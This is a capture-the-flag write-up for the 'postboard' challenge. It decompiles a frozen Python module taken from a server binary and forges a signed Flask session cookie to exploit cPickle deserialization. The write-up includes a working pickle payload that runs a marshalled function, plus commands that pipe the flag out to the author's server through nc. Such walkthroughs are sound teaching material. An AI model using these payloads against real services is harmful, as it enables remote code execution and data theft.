```
postboard
420

I made a post on this new forum, but the memes were so dank that the admin disabled it! I managed to get my hands on a broken binary for the server, can you figure out how to pwn it and retrieve my memes?

46.101.248.243 1337

NOTE: if you are getting server 500 errors, clear your cookies
```

By searching in broken binary for `__main__` or something like `This post has been disabled by the admin for being too dank.` we can find `0x881D40` offset and `0x8C8FE0` offset. After that by checking the cross references we can find `PyImport_ImportFrozenModule` function at `0x41DFDD`. This function finds the frozen module and loads it using `PyMarshal_ReadObjectFromString`. So we can extract the frozen module from `0x8C8FE0` and using `marshal.loads(frozen_module)` we can extract the code. After that by using `meta` module we can get .py file.

```python
import marshal
frozen_module=open("server.b","rb").read()
code=marshal.loads(frozen_module)
import meta, ast
mod = meta.decompile(code)
source = meta.dump_python_source(mod)
```

Here the source variable is the string of the .py file which can be seen [here.](solution.py)

By inspecting this file first we spot the cPickle. The script reads the `sesion['auth']` from cookie(encrypted but we have the key at the bottom of the code) and loads it. So now we can use pickle exploit. For signing the pickle I run my own server using flask and the same key and copied the crafted cookie.

At first I tried to do `system('cat ../flagdir/flag 2>&1 | nc ip_of_my_server 10101')` and opened the server using `nc -lvp 10101` but I got permission denied error. The file was owned by `root` however we are `post`. So I used another method that can be found [here.](https://www.cs.uic.edu/~s/musings/pickle.html).

```python
def foo():
  import os
  global posts
  flagg = posts["flag"].i
  os.system('echo "'+flagg+'" | nc ip_of_my_server 10101')

@app.route('/<arg>', methods=['POST', 'GET'])
def index(arg):
    res = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
    session['auth'] = res
    return "asdasdasd"
    return None

app.secret_key = 'can_y0u_5Teal_mY+seCr3t-key'
app.run(port=1337, debug=False, host='0.0.0.0')
```

The answer is `BLAZE{pickle_is_super_secure_with_signing_right?}`